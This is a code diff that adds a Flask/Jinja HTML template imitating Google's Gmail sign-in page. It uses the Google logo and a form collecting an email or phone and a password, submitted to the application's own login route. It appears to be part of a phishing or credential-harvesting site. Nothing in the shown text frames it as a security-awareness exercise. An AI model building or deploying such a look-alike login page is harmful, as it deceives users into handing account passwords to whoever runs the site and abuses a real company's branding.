@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Gmail</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+</head>
+<body>
+    <div class="container gmail-container">
+        <img src="{{ url_for('static', filename='images/google-logo.png') }}" alt="Google Logo" class="logo">
+
+        <form method="POST" action="{{ url_for('main.login') }}">
+            <input type="text" name="username" placeholder="Email or phone" required>
+            
+            {% if error %}
+                <p class="error">{{ error }}</p>
+            {% endif %}
+            
+            <input type="password" name="password" placeholder="Enter your password" required>
+            <button type="submit">Sign in</button>
+        </form>
+        <p class="forgot">Forgot email?</p>
+    </div>
+</body>
+</html>
